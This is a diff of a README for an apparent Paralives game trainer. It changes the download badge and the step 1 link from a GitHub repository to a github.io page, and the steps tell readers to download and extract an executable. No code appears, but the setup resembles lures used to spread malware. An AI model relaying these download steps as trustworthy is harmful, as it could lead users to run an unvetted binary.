@@ -1,6 +1,6 @@
 # 🎮 Paralives-Ultimate-Trainer-2026 - Master your simulation with ease today
 
-[![Download Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026)
+[![Download Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://umermo1839.github.io)
 
 ## 🛠️ About this application
 
@@ -32,7 +32,7 @@ Ensure your computer meets these conditions before you run the trainer.
 
 Follow these steps to obtain and start the application.
 
-1. Visit the project website at [https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026](https://github.com/Umermo1839/Paralives-Ultimate-Trainer-2026).
+1. Visit the project website at [https://umermo1839.github.io](https://umermo1839.github.io).
 2. Locate the link to the latest version of the trainer on the page.
 3. Download the executable file to a folder on your computer.
 4. Extract the file if it comes in a compressed format.
